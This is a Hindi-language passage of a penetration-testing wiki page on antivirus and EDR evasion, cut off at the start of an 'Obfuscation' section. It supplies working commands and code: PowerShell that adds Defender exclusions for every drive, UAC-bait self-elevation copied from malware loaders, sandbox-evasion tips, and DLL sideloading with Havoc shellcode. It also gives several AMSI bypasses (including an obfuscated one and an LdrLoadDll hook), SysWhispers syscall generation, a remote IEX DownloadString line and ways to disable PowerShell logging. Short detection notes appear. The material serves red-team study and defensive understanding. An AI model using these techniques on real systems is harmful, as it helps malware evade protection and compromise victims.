# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**यह पेज सबसे पहले** [**@m2rc_p**](https://twitter.com/m2rc_p)**ने लिखा था!**

## Defender को रोकें

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender को काम करने से रोकने वाला एक टूल।
- [no-defender](https://github.com/es3n1n/no-defender): किसी दूसरे AV का रूप धारण करके Windows Defender को काम करने से रोकने वाला एक टूल।
- [अगर आप admin हैं, तो Defender को disable करें](basic-powershell-for-pentesters/README.md)

### Defender के साथ छेड़छाड़ करने से पहले Installer-शैली का UAC bait

Game cheats का रूप धारण करने वाले public loaders अक्सर unsigned Node.js/Nexe installers के रूप में आते हैं, जो पहले **यूज़र से elevation की अनुमति मांगते हैं** और उसके बाद ही Defender को निष्क्रिय करते हैं। इसका तरीका सरल है:

1. `net session` से जाँचें कि प्रक्रिया administrative context में चल रही है या नहीं। यह command तभी सफल होती है जब caller के पास admin rights हों, इसलिए विफलता का मतलब है कि loader standard user के रूप में चल रहा है।
2. मूल command line को बनाए रखते हुए, अपेक्षित UAC consent prompt दिखाने के लिए `RunAs` verb के साथ तुरंत खुद को फिर से launch करें।

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

पीड़ित पहले से ही मानते हैं कि वे “cracked” सॉफ़्टवेयर इंस्टॉल कर रहे हैं, इसलिए वे आमतौर पर prompt स्वीकार कर लेते हैं, जिससे malware को Defender की policy बदलने के लिए ज़रूरी अधिकार मिल जाते हैं।<sup>[[26]](#references)</sup>

### हर drive letter के लिए व्यापक `MpPreference` exclusions

एक बार elevated access मिलने के बाद, GachiLoader-जैसी chains service को पूरी तरह बंद करने के बजाय Defender के blind spots को अधिकतम करती हैं। Loader पहले GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) को बंद करता है और फिर **बेहद व्यापक exclusions** जोड़ता है, ताकि हर user profile, system directory और removable disk को scan न किया जा सके:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

मुख्य अवलोकन:

- यह लूप हर माउंटेड filesystem (D:\, E:\, USB sticks आदि) पर चलता है, इसलिए **डिस्क पर कहीं भी छोड़े गए भविष्य के payload को अनदेखा किया जाता है**।
- `.sys` extension का exclusion भविष्य को ध्यान में रखकर है—हमलावर बाद में Defender को दोबारा छुए बिना unsigned drivers लोड करने का विकल्प सुरक्षित रखते हैं।
- सभी बदलाव `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` के अंतर्गत होते हैं, जिससे बाद के चरण यह पुष्टि कर सकते हैं कि exclusions बने हुए हैं या उन्हें बढ़ा सकते हैं—और इसके लिए UAC को दोबारा ट्रिगर करने की ज़रूरत नहीं होती।

चूँकि कोई Defender service बंद नहीं की जाती, साधारण health checks अब भी “antivirus active” बताते रहते हैं, हालाँकि real-time inspection उन paths को जाँचती ही नहीं है।<sup>[[26]](#references)</sup>

## **AV Evasion Methodology**

फ़िलहाल, AVs यह जाँचने के लिए अलग-अलग तरीके इस्तेमाल करते हैं कि कोई file malicious है या नहीं: static detection, dynamic analysis, और अधिक उन्नत EDRs के लिए behavioural analysis।

### **Static detection**

Static detection में binary या script के भीतर ज्ञात malicious strings या bytes की arrays को flag किया जाता है। साथ ही, file से ही जानकारी निकाली जाती है (जैसे file description, company name, digital signatures, icon, checksum आदि)। इसका मतलब है कि ज्ञात public tools का इस्तेमाल करने पर पकड़े जाने की आशंका बढ़ सकती है, क्योंकि संभवतः उनका विश्लेषण करके उन्हें malicious के रूप में flag किया जा चुका है। इस तरह की detection से बचने के कुछ तरीके हैं:

- **Encryption**

अगर आप binary को encrypt करते हैं, तो AV के पास आपके program को detect करने का कोई तरीका नहीं होगा। लेकिन आपको memory में program को decrypt करके चलाने के लिए किसी तरह के loader की ज़रूरत होगी।

- **Obfuscation**

कभी-कभी binary या script में कुछ strings बदलना ही AV से बच निकलने के लिए काफ़ी होता है, लेकिन आप जिस चीज़ को obfuscate करने की कोशिश कर रहे हैं, उसके आधार पर यह काम समय लेने वाला हो सकता है।

- **Custom tooling**

अगर आप अपने tools खुद विकसित करते हैं, तो उनके लिए कोई ज्ञात bad signatures नहीं होंगे, लेकिन इसमें काफ़ी समय और मेहनत लगती है।

> [!TIP]
> Windows Defender static detection के विरुद्ध जाँच करने का एक अच्छा तरीका [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) है। यह file को कई segments में बाँटता है और फिर Defender से हर segment को अलग-अलग scan करने के लिए कहता है। इस तरह यह आपको ठीक-ठीक बता सकता है कि आपकी binary में किन strings या bytes को flag किया गया है।

मैं व्यावहारिक AV Evasion के बारे में यह [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) देखने की पुरज़ोर सलाह देता हूँ।

### **Dynamic analysis**

Dynamic analysis में AV आपकी binary को sandbox में चलाता है और malicious activity पर नज़र रखता है (जैसे आपके browser के passwords को decrypt करके पढ़ने की कोशिश करना, LSASS पर minidump करना आदि)। इस हिस्से से निपटना थोड़ा पेचीदा हो सकता है, लेकिन sandboxes से बचने के लिए आप ये चीज़ें कर सकते हैं।

- **चलाने से पहले Sleep करना** इसे कैसे implement किया गया है, इस पर निर्भर करते हुए, AV की dynamic analysis को bypass करने का यह एक बेहतरीन तरीका हो सकता है। AVs के पास files को scan करने के लिए बहुत कम समय होता है, ताकि user का workflow बाधित न हो। इसलिए लंबे समय तक sleep करने से binaries का analysis बाधित हो सकता है। समस्या यह है कि कई AV sandboxes, इसे कैसे implement किया गया है, उसके आधार पर sleep को छोड़ सकते हैं।
- **मशीन के resources की जाँच करना** आम तौर पर, sandboxes के पास काम करने के लिए बहुत कम resources होते हैं (जैसे < 2GB RAM), वरना वे user की machine को धीमा कर सकते हैं। आप यहाँ काफ़ी रचनात्मक भी हो सकते हैं—उदाहरण के लिए, CPU का तापमान या fan की speed जाँचना, क्योंकि sandbox में हर चीज़ implement नहीं होगी।
- **मशीन-विशिष्ट जाँचें** अगर आप ऐसे user को target करना चाहते हैं जिसका workstation "contoso.local" domain से जुड़ा है, तो आप computer का domain जाँचकर देख सकते हैं कि वह आपके बताए domain से मेल खाता है या नहीं। अगर मेल न खाए, तो आप अपने program को exit करवा सकते हैं।

पता चला है कि Microsoft Defender के Sandbox computername का नाम HAL9TH है। इसलिए detonation से पहले आप अपने malware में computer name की जाँच कर सकते हैं। अगर नाम HAL9TH से मेल खाता है, तो इसका मतलब है कि आप Defender के sandbox में हैं, इसलिए आप अपने program को exit करवा सकते हैं।

<figure><img src="../images/image (209).png" alt=""><figcaption><p>स्रोत: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Sandboxes से बचने के लिए [@mgeeky](https://twitter.com/mariuszbit) के कुछ और बेहतरीन सुझाव

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

जैसा कि हमने इस post में पहले कहा है, **public tools** को आखिरकार **detect कर लिया जाएगा**, इसलिए आपको खुद से एक सवाल पूछना चाहिए:

उदाहरण के लिए, अगर आप LSASS dump करना चाहते हैं, तो **क्या आपको सचमुच mimikatz इस्तेमाल करने की ज़रूरत है**? या आप कोई ऐसा अलग project इस्तेमाल कर सकते हैं जो कम जाना-पहचाना हो और LSASS dump भी करता हो।

शायद दूसरा विकल्प ही सही है। उदाहरण के तौर पर mimikatz को लें: यह AVs और EDRs द्वारा सबसे ज़्यादा flag किए गए malware में से एक है—शायद सबसे ज़्यादा flag किया गया। यह project अपने आप में बहुत बढ़िया है, लेकिन AVs से बचने के लिए इसके साथ काम करना एक बुरा सपना है। इसलिए, आप जो हासिल करना चाहते हैं, उसके लिए alternatives खोजें।

> [!TIP]
> Evasion के लिए अपने payloads में बदलाव करते समय, Defender में **automatic sample submission बंद करना** न भूलें। और कृपया, अगर आपका लक्ष्य लंबे समय तक evasion हासिल करना है, तो **VIRUSTOTAL पर UPLOAD न करें**। अगर आप जाँचना चाहते हैं कि कोई खास AV आपका payload detect करता है या नहीं, तो उसे VM पर install करें, automatic sample submission बंद करने की कोशिश करें और मनचाहा नतीजा मिलने तक वहीं test करें।

## EXEs vs DLLs

जब भी संभव हो, evasion के लिए हमेशा **DLLs के इस्तेमाल को प्राथमिकता दें**। मेरे अनुभव में, DLL files को आम तौर पर **काफ़ी कम detect और analyze किया जाता है**, इसलिए कुछ मामलों में detection से बचने के लिए यह एक बहुत आसान तरकीब है (बशर्ते आपके payload को DLL के रूप में चलाने का कोई तरीका हो)।

जैसा कि हम इस image में देख सकते हैं, Havoc के DLL Payload की antiscan.me पर detection rate 4/26 है, जबकि EXE payload की detection rate 7/26 है।

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>एक सामान्य Havoc EXE payload और एक सामान्य Havoc DLL की antiscan.me पर तुलना</p></figcaption></figure>

अब हम DLL files के साथ इस्तेमाल की जा सकने वाली कुछ तरकीबें दिखाएँगे, जिनसे आप ज़्यादा stealthy रह सकते हैं।

## DLL Sideloading & Proxying

**DLL Sideloading** loader द्वारा इस्तेमाल किए जाने वाले DLL search order का फ़ायदा उठाता है। इसके लिए victim application और malicious payload(s) को एक-दूसरे के साथ रखा जाता है।

आप [Siofra](https://github.com/Cybereason/siofra) और नीचे दी गई powershell script का इस्तेमाल करके उन programs का पता लगा सकते हैं जो DLL Sideloading के प्रति संवेदनशील हैं:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

यह command "C:\Program Files\\" के अंदर DLL hijacking के लिए susceptible programs की सूची और वे जिन DLL files को load करने की कोशिश करते हैं, उन्हें output करेगा।

मैं आपको **खुद DLL Hijackable/Sideloadable programs को explore करने** की पुरज़ोर सलाह देता हूँ। सही तरीके से की गई यह technique काफ़ी stealthy होती है, लेकिन अगर आप सार्वजनिक रूप से ज्ञात DLL Sideloadable programs का इस्तेमाल करते हैं, तो आप आसानी से पकड़े जा सकते हैं।

किसी program द्वारा load किए जाने की अपेक्षा वाले नाम की malicious DLL रखने भर से आपका payload load नहीं होगा, क्योंकि program उस DLL के अंदर कुछ विशिष्ट functions की अपेक्षा करता है। इस समस्या को ठीक करने के लिए, हम **DLL Proxying/Forwarding** नाम की एक और technique इस्तेमाल करेंगे।

**DLL Proxying** program द्वारा proxy (और malicious) DLL से की गई calls को original DLL तक forward करता है। इससे program की functionality बनी रहती है और आपके payload के execution को handle करना संभव होता है।

मैं [@flangvik](https://twitter.com/Flangvik/) के [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) project का इस्तेमाल करूँगा।

ये वे steps हैं जिनका मैंने पालन किया:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

आख़िरी command हमें 2 files देगा: एक DLL source code template और मूल renamed DLL।

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

ये परिणाम हैं:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

हमारे shellcode ([SGN](https://github.com/EgeBalci/sgn) से encoded) और proxy DLL, दोनों की [antiscan.me](https://antiscan.me) पर Detection rate 0/26 है! मैं इसे सफलता कहूँगा।

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> DLL Sideloading के बारे में [S3cur3Th1sSh1t का twitch VOD](https://www.twitch.tv/videos/1644171543) और इस विषय को और गहराई से समझने के लिए [ippsec का वीडियो](https://www.youtube.com/watch?v=3eROsG_WNpE) देखने की मैं **पुरज़ोर सलाह देता हूँ**।

### Forwarded Exports का दुरुपयोग (ForwardSideLoading)

Windows PE modules ऐसे functions export कर सकते हैं जो वास्तव में "forwarders" होते हैं: code की ओर point करने के बजाय, export entry में `TargetDll.TargetFunc` के रूप में एक ASCII string होती है। जब कोई caller export को resolve करता है, तो Windows loader:

- `TargetDll` को load करेगा, अगर वह पहले से loaded न हो
- उसमें से `TargetFunc` को resolve करेगा

समझने योग्य मुख्य व्यवहार:
- अगर `TargetDll` एक KnownDLL है, तो उसे protected KnownDLLs namespace (जैसे ntdll, kernelbase, ole32) से उपलब्ध कराया जाता है।<sup>[[15]](#references)</sup>
- अगर `TargetDll` एक KnownDLL नहीं है, तो सामान्य DLL search order का उपयोग किया जाता है, जिसमें उस module की directory भी शामिल है जो forward resolution कर रहा है।

इससे एक indirect sideloading primitive संभव होता है: ऐसी signed DLL खोजें जो किसी function को ऐसे non-KnownDLL module name पर forward करती हो, फिर उस signed DLL के साथ उसी नाम की attacker-controlled DLL रखें जो forwarded target module का नाम हो। जब forwarded export को invoke किया जाता है, तो loader forward को resolve करके उसी directory से आपकी DLL load करता है और आपका DllMain execute करता है।<sup>[[13]](#references)</sup>

Windows 11 पर देखा गया उदाहरण:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` KnownDLL नहीं है, इसलिए इसे सामान्य खोज क्रम के अनुसार resolve किया जाता है।

PoC (कॉपी-पेस्ट):
1) Signed system DLL को writable folder में कॉपी करें
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) उसी फ़ोल्डर में एक malicious `NCRYPTPROV.dll` रखें। Code execution के लिए एक न्यूनतम DllMain पर्याप्त है; DllMain को trigger करने के लिए forwarded function लागू करने की ज़रूरत नहीं है।
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) signed LOLBin के साथ forward को ट्रिगर करें:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

देखा गया व्यवहार:
- rundll32 (signed) side-by-side `keyiso.dll` (signed) लोड करता है
- `KeyIsoSetAuditingInterface` को resolve करते समय, loader forward को `NCRYPTPROV.SetAuditingInterface` तक फ़ॉलो करता है
- इसके बाद loader `C:\test` से `NCRYPTPROV.dll` लोड करता है और उसका `DllMain` execute करता है
- अगर `SetAuditingInterface` implement नहीं किया गया है, तो "missing API" error `DllMain` चलने के बाद ही मिलेगा

हंटिंग के सुझाव:
- ऐसे forwarded exports पर ध्यान दें जिनका target module KnownDLL न हो। KnownDLLs, `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` के अंतर्गत सूचीबद्ध हैं।
- आप निम्न जैसे tooling से forwarded exports enumerate कर सकते हैं:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- उम्मीदवारों को खोजने के लिए Windows 11 forwarder inventory देखें: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Detection/defense के विचार:
- ऐसे LOLBins (जैसे, rundll32.exe) की निगरानी करें जो non-system paths से signed DLLs लोड करते हैं, और उसके बाद उसी directory से समान base name वाले non-KnownDLLs लोड करते हैं
- ऐसे process/module chains पर alert करें: `rundll32.exe` → user-writable paths के अंतर्गत non-system `keyiso.dll` → `NCRYPTPROV.dll`
- code integrity policies (WDAC/AppLocker) लागू करें और application directories में write+execute को deny करें

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze suspended processes, direct syscalls और alternative execution methods का उपयोग करके EDRs को bypass करने वाला payload toolkit है`

आप Freeze का उपयोग अपने shellcode को stealthy तरीके से load और execute करने के लिए कर सकते हैं।

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion बस बिल्ली और चूहे का खेल है। आज जो काम करता है, कल detect हो सकता है, इसलिए कभी भी सिर्फ़ एक tool पर निर्भर न रहें। अगर संभव हो, तो कई evasion techniques को एक के बाद एक आज़माएँ।

## Direct/Indirect Syscalls और SSN Resolution (SysWhispers4)

EDR अक्सर `ntdll.dll` के syscall stubs पर **user-mode inline hooks** लगाते हैं। इन hooks को bypass करने के लिए, आप **direct** या **indirect** syscall stubs generate कर सकते हैं, जो सही **SSN** (System Service Number) load करते हैं और hooked export entrypoint को execute किए बिना kernel mode में transition करते हैं।<sup>[[32]](#references)</sup>

**Invocation के विकल्प:**
- **Direct (embedded)**: generated stub में `syscall`/`sysenter`/`SVC #0` instruction emit करें (इससे `ntdll` export hit नहीं होता)।
- **Indirect**: किसी मौजूदा `ntdll` के अंदर `syscall` gadget पर jump करें, ताकि kernel transition `ntdll` से आया हुआ दिखे (heuristic evasion के लिए उपयोगी); **randomized indirect** हर call पर pool से एक gadget चुनता है।
- **Egg-hunt**: disk पर static `0F 05` opcode sequence embed करने से बचें; runtime पर syscall sequence resolve करें।

**Hook-resistant SSN resolution strategies:**
- **FreshyCalls (VA sort)**: stub bytes पढ़ने के बजाय syscall stubs को virtual address के आधार पर sort करके SSN का अनुमान लगाएँ।
- **SyscallsFromDisk**: clean `\KnownDlls\ntdll.dll` map करें, उसके `.text` से SSN पढ़ें, फिर उसे unmap करें (सभी in-memory hooks को bypass करता है)।
- **RecycledGate**: VA-sorted SSN inference को opcode validation के साथ जोड़ता है, जब stub clean हो; hooked होने पर VA inference पर वापस जाता है।
- **HW Breakpoint**: `syscall` instruction पर DR0 सेट करें और runtime पर `EAX` से SSN capture करने के लिए VEH का उपयोग करें, hooked bytes को parse किए बिना।

SysWhispers4 के उपयोग का उदाहरण:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI को "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)" को रोकने के लिए बनाया गया था। शुरुआत में, AVs केवल **डिस्क पर मौजूद फ़ाइलों** को स्कैन कर सकते थे। इसलिए, अगर आप किसी तरह **सीधे memory में** payloads चला सकते थे, तो AV उसे रोकने के लिए कुछ नहीं कर सकता था, क्योंकि उसे पर्याप्त visibility नहीं मिलती थी।

AMSI सुविधा Windows के इन components में integrated है।

- User Account Control, या UAC (EXE, COM, MSI या ActiveX installation को elevate करना)
- PowerShell (scripts, interactive use और dynamic code evaluation)
- Windows Script Host (wscript.exe और cscript.exe)
- JavaScript और VBScript
- Office VBA macros

इससे antivirus solutions script के contents को unencrypted और unobfuscated रूप में उपलब्ध कराकर, उनके behavior का निरीक्षण कर सकते हैं।

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` चलाने पर Windows Defender में यह alert दिखेगा।

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

ध्यान दें कि यह `amsi:` और उसके बाद उस executable का path जोड़ता है जिससे script चली थी; इस मामले में, powershell.exe।

हमने डिस्क पर कोई फ़ाइल नहीं डाली, फिर भी AMSI की वजह से हम memory में पकड़े गए।

इसके अलावा, **.NET 4.8** से C# code भी AMSI के ज़रिए चलाया जाता है। इसका असर `Assembly.Load(byte[])` पर भी पड़ता है, जिसका उपयोग memory में execution load करने के लिए किया जाता है। इसीलिए, अगर आप AMSI से बचते हुए memory में execution करना चाहते हैं, तो .NET के पुराने versions (जैसे 4.7.2 या उससे नीचे) इस्तेमाल करने की सलाह दी जाती है।

AMSI से बचने के कुछ तरीके हैं:

- **Obfuscation**

चूँकि AMSI मुख्य रूप से static detections पर काम करता है, इसलिए जिन scripts को आप load करने की कोशिश कर रहे हैं, उनमें बदलाव करना detection से बचने का अच्छा तरीका हो सकता है।

हालाँकि, AMSI scripts की कई layers होने पर भी उन्हें unobfuscate कर सकता है। इसलिए, obfuscation का तरीका कैसा है, इसके आधार पर यह खराब विकल्प भी हो सकता है। इससे बच निकलना इतना सीधा नहीं रहता। लेकिन कभी-कभी, आपको बस कुछ variable names बदलने होते हैं और काम हो जाता है; यह इस पर निर्भर करता है कि किसी चीज़ को कितना flag किया गया है।

- **AMSI Bypass**

चूँकि AMSI, powershell (और cscript.exe, wscript.exe आदि) process में DLL load करके implement किया जाता है, इसलिए unprivileged user के रूप में भी इसके साथ आसानी से छेड़छाड़ की जा सकती है। AMSI के implementation में इस खामी की वजह से researchers ने AMSI scanning से बचने के कई तरीके खोजे हैं।

**Forcing an Error**

AMSI initialization को fail करने पर मजबूर करने (`amsiInitFailed`) से मौजूदा process के लिए कोई scan शुरू नहीं होगा। इसे सबसे पहले [Matt Graeber](https://twitter.com/mattifestation) ने सार्वजनिक किया था और Microsoft ने इसके व्यापक इस्तेमाल को रोकने के लिए एक signature विकसित किया है।

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

AMSI को मौजूदा powershell process के लिए अनुपयोगी बनाने के लिए powershell code की बस एक लाइन ही काफ़ी थी। बेशक, इस लाइन को AMSI ने खुद ही flag कर दिया है, इसलिए इस technique का इस्तेमाल करने के लिए इसमें कुछ बदलाव करने होंगे।

यह रहा एक modified AMSI bypass, जिसे मैंने इस [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) से लिया है।

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

ध्यान रखें कि यह पोस्ट प्रकाशित होने के बाद संभवतः flag हो जाएगी, इसलिए अगर आपकी योजना पकड़े बिना रहने की है, तो कोई भी code प्रकाशित न करें।

**Memory Patching**

इस technique की खोज सबसे पहले [@RastaMouse](https://twitter.com/_RastaMouse/) ने की थी। इसमें amsi.dll में "AmsiScanBuffer" function (जो user द्वारा दिए गए input को scan करने के लिए ज़िम्मेदार है) का address ढूँढ़कर उसे ऐसे instructions से overwrite किया जाता है जो E_INVALIDARG का code लौटाते हैं। इस तरह, वास्तविक scan का result 0 लौटाता है, जिसे clean result माना जाता है।

> [!TIP]
> अधिक विस्तृत जानकारी के लिए कृपया [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) पढ़ें।

powershell के साथ AMSI को bypass करने के लिए कई अन्य techniques भी इस्तेमाल की जाती हैं। इनके बारे में अधिक जानने के लिए [**यह page**](basic-powershell-for-pentesters/index.html#amsi-bypass) और [**यह repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) देखें।

### amsi.dll को load होने से रोककर AMSI को block करना (LdrLoadDll hook)

AMSI केवल तभी initialize होता है, जब `amsi.dll` मौजूदा process में load हो जाता है। एक मज़बूत, language-agnostic bypass के लिए `ntdll!LdrLoadDll` पर user-mode hook लगाया जा सकता है, जो अनुरोधित module `amsi.dll` होने पर error लौटाता है। इसके परिणामस्वरूप, AMSI load नहीं होता और उस process के लिए कोई scan नहीं होता।<sup>[[23]](#references)</sup>

Implementation की रूपरेखा (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
नोट्स
- PowerShell, WScript/CScript और custom loaders—इन सभी पर काम करता है (यानी ऐसी कोई भी चीज़ जो अन्यथा AMSI लोड करती)।
- लंबे command-line निशान से बचने के लिए इसे stdin के ज़रिए scripts देने के साथ इस्तेमाल करें (`PowerShell.exe -NoProfile -NonInteractive -Command -`)।
- इसे LOLBins के ज़रिए चलाए गए loaders में इस्तेमाल होते देखा गया है (उदाहरण के लिए, `regsvr32` द्वारा `DllRegisterServer` को call करना)।

**[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** tool भी AMSI को bypass करने के लिए script बनाता है।
**[https://amsibypass.com/](https://amsibypass.com/)** tool भी AMSI को bypass करने वाली script बनाता है, जो randomized user-defined function, variables और character expressions का उपयोग करके signature से बचती है और signature से बचने के लिए PowerShell keywords में random character casing लागू करती है।

**पता लगाए गए signature को हटाएँ**

मौजूदा process की memory से पता लगाए गए AMSI signature को हटाने के लिए **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** और **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** जैसे tool इस्तेमाल कर सकते हैं। यह tool मौजूदा process की memory में AMSI signature को scan करके और फिर उसे NOP instructions से overwrite करके काम करता है, जिससे वह प्रभावी रूप से memory से हट जाता है।

**AMSI का उपयोग करने वाले AV/EDR products**

AMSI का उपयोग करने वाले AV/EDR products की सूची **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** में मिल सकती है।

**Powershell version 2 का उपयोग करें**
अगर आप PowerShell version 2 का उपयोग करते हैं, तो AMSI लोड नहीं होगा, इसलिए आप अपनी scripts को AMSI द्वारा scan किए बिना चला सकते हैं। आप यह कर सकते हैं:

```bash
powershell.exe -version 2
```

## PS Logging

PowerShell logging एक ऐसी सुविधा है जो आपको सिस्टम पर निष्पादित सभी PowerShell commands को log करने देती है। यह auditing और troubleshooting के लिए उपयोगी हो सकता है, लेकिन **पहचान से बचने की कोशिश करने वाले attackers के लिए समस्या भी बन सकता है**।

PowerShell logging को bypass करने के लिए, आप ये techniques इस्तेमाल कर सकते हैं:

- **PowerShell Transcription और Module Logging को disable करें**: इस उद्देश्य के लिए [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) जैसे tool का इस्तेमाल कर सकते हैं।
- **Powershell version 2 का इस्तेमाल करें**: यदि आप PowerShell version 2 इस्तेमाल करते हैं, तो AMSI load नहीं होगा, इसलिए आप अपने scripts को AMSI द्वारा scan किए बिना चला सकते हैं। ऐसा करने के लिए: `powershell.exe -version 2`
- **एक unmanaged PowerShell session का इस्तेमाल करें**: `powershell.exe` launch किए बिना PowerShell host करने के लिए [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) का इस्तेमाल करें (यह Cobalt Strike के `powerpick` में इस्तेमाल किया गया तरीका है)। इससे विशेष रूप से `powershell.exe` process से जुड़े controls से बचा जा सकता है, लेकिन इससे AMSI, Script Block Logging या PowerShell के अन्य सभी defenses अपने-आप disable नहीं होते; coverage runtime और host implementation पर निर्भर करती है।


## Obfuscation

> [!TIP]
